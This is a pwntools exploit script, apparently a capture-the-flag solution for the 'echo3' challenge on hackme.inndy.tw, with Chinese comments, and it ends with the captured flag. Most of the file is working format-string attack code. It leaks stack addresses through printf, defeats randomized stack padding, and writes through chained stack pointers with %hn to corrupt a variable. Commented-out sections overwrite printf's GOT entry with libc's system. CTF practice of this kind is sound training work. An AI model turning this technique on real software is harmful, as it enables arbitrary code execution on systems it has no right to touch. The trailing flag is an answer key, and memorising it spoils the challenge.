#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
{32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
20

栈上制造空间一共20种情况

[16, 32, 48, 64, 80,]
[4112, 4128, 4144, 4160, 4176,]
[8208, 8224, 8240, 8256, 8272,] 
[12304, 12320, 12336, 12352, 12368]
分四次从小到大进行查找

b *0x08048737  read magic
b *0x08048774  分配栈空间
b *0x08048646  printf

几个变量情况：
如果没有随机占位，236 / 4的位置上，值为0x080484b0

"""


import re, sys, os.path as path, struct
from pwn import *
from pwnlib import gdb


context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3_patched")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")

elf = ELF(elf_name)
# io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
libc = elf.libc

# 分组探测，是为了让数值相近的padding在一起。
# 如果实际padding较小，但探测了较大的数值，越界会导致段错误。
PADDINGS = [
    [16, 32, 48, 64, 80,],
    [4112, 4128, 4144, 4160, 4176,],
    [8208, 8224, 8240, 8256, 8272,],
    [12304, 12320, 12336, 12352, 12368,],
]


class Actor:
    def __init__(self, io):
        self.io = io
        self._padding = None  # TODO: 随机化情况需要修改
        self._ebp1addr = None

    @property
    def padding(self):
        return self._padding
    
    @padding.setter
    def padding(self, padding):
        self._padding = padding
        self.calc_offset()

    @property
    def ebp1addr(self):
        return self._ebp1addr

    @ebp1addr.setter
    def ebp1addr(self, ebp1addr):
        self._ebp1addr = ebp1addr
        self.calc_offset()

    def calc_offset(self):
        if self.ebp1addr is not None and self.padding is not None:
            self.esp_addr = self.ebp1addr - 136 - self.padding
            self.ebp0addr = self.esp_addr + 72
            p1addr = self.esp_addr + self.padding + 316
            self.p_addr = (self.esp_addr + self.padding + 88, p1addr, (p1addr & 0xffffff00) + 0x100)
            self.p_idx = tuple([(x - self.esp_addr) // 4 for x in self.p_addr])
            self.i_addr = self.ebp0addr - 0x14

    def detect_random(self):
        for pads in PADDINGS:
            # 如果没有随机占位，236 / 4的位置上，值为0x080484b0
            payload = "".join(["%{}$p#".format((236 + pad) // 4 ) for pad in pads])
            payload += "%18$p#%19$p$$$$$$$$\0"
            self.io.sendline(payload)
            r = self.io.recvuntil("$$$$$$$$", drop=True)
            a = r.split(b"#")
            assert a[-1] == b"0x804877b"
            if self.ebp1addr is None:
                self.ebp1addr = int(a[-2], 16)
            for idx, addr in enumerate(a[:-2]):
                try:
                    addr_int = int(addr, 16)
                    # 如果没有随机占位，236 / 4的位置上，值为0x080484b0
                    if addr_int == 0x080484b0:
                        self.padding = pads[idx]
                        break
                except ValueError:
                    pass
            if self.padding is not None:
                break
        if self.padding is not None and self.ebp1addr is not None:
            log.success("padding_random_bytes = %d", self.padding)
            log.success("p0idx = %d", self.p_idx[0])
            log.success("p1idx = %d", self.p_idx[1])
            log.success("p2idx = %d", self.p_idx[2])
            log.success("esp_addr = 0x%x", self.esp_addr)
            log.success("ebp0addr = 0x%x", self.ebp0addr)
            log.success("ebp1addr = 0x%x", self.ebp1addr)
            log.success("p0addr = 0x%x", self.p_addr[0])
            log.success("p1addr = 0x%x", self.p_addr[1])
            log.success("p2addr = 0x%x", self.p_addr[2])
            log.success("i_addr = 0x%x", self.i_addr)

        else:
            raise ValueError("Cannot locate ebp1addr or random_bytes!")

    # def get_libc_and_stack_addr(self):
    #     # 获取libc与栈地址
    #     payload = "%18$p#%19$p#%34$p#%35$p$$$$$$$$\0"
    #     self.io.sendline(payload)
    #     r = self.io.recvuntil("$$$$$$$$", drop=True)
    #     a = r.split(b"#")
    #     assert a[1] == b"0x804877b" and a[2] == b"(nil)"
    #     self.ebp1addr = int(a[0], 16)
    #     log.info("ebp1addr = 0x%x", self.ebp1addr)
    #     self.esp_addr = self.ebp1addr - self.random_bytes - 136
    #     log.info("esp_addr = 0x%x", self.esp_addr)
    #     libc_addr = int(a[3], 16)
    #     log.info("libc_addr = 0x%x", libc_addr)
    #     libc.address = (libc_addr - 0x18000) & 0xfffff000
    #     log.info("libc_basse = 0x%x", libc.address)

    # def get_var_i_addr(self):
    #     # 获取变量i的地址
    #     self.ebp0addr = self.esp_addr + 72
    #     log.info("ebp0addr = 0x%x", self.ebp0addr)
        
    #     self.p0addr = self.esp_addr + 88
    #     log.info("p0addr = 0x%x", self.p0addr)
    #     self.p1addr = self.esp_addr + self.random_bytes + 316
    #     log.info("p1addr = 0x%x", self.p1addr)
    #     self.i_addr = self.ebp0addr - 0x14
    #     log.info("i_addr = 0x%x", self.i_addr)

    def set_var_i_minus(self):
        # 修改变量i
        # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
        # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
        # 经测试，无法同时修改p1内容和i的内容
        assert (self.i_addr + 3) & 0xffff == (self.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
        bit4 = (self.i_addr + 3) & 0xffff
        t = (0x80 - bit4) & 0xff
        minus_data = t if t > 0 else 256
        payload = "%{bit4}c%{p0idx}$hn%{minus_data}c%{p1idx}$hhn$$$$$$$$\0".format(
            p0idx=self.p_idx[0], bit4=bit4,
            p1idx=self.p_idx[1], minus_data=minus_data
        )
        self.io.sendline(payload)
        self.io.recvuntil("$$$$$$$$", drop=True)

    # def write_printf_got_addresses(self):
    #     self.p2addr = (self.p1addr & 0xffffff00) + 0x100
    #     log.info("p2addr = 0x%x", self.p2addr)
    #     self.p2idx = (self.p2addr - self.esp_addr) // 4
    #     payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p0idx, data=self.p2addr & 0xffff)
    #     self.io.sendline(payload)
    #     self.io.recvuntil("$$$$$$$$", drop=True)

    #     a = elf.got["printf"]
    #     gots = struct.pack("<IIII", a, a + 1, a + 2, a + 3)
    #     for i in range(16):
    #         if i > 0:
    #             payload = "%{data}c%{p0idx}$hhn$$$$$$$$\0".format(p0idx=self.p0idx, data=(self.p2addr & 0xff) + i)
    #             self.io.sendline(payload)
    #             self.io.recvuntil("$$$$$$$$", drop=True)
    #         payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p1idx, data=gots[i])
    #         self.io.sendline(payload)
    #         self.io.recvuntil("$$$$$$$$", drop=True)

    # def write_system_to_printf_got(self):
    #     a = libc.sym["system"]
    #     l = [0]
    #     for i in range(4):
    #         byte = (((a >> (i * 8)) & 0xff) - sum(l)) & 0xff
    #         if byte == 0:
    #             byte = 256
    #         l.append(byte)
    #     l = l[1:]
    #     payload = "".join(["%{}c%{}$hhn".format(data, self.p2idx + i) for i, data in enumerate(l)]) + "$$$$$$$$\0"
    #     self.io.sendline(payload)
    #     self.io.recvuntil("$$$$$$$$", drop=True)

    # def main(self):
    #     self.get_libc_and_stack_addr()
    #     self.get_var_i_addr()
    #     self.set_var_i_minus()
    #     self.write_printf_got_addresses()
    #     self.write_system_to_printf_got()

    def main(self):
        self.detect_random()
        self.set_var_i_minus()

def main():
    io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
    actor = Actor(io)
    actor.main()

    gdb.attach(io)
    pause()

    io.interactive()



if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}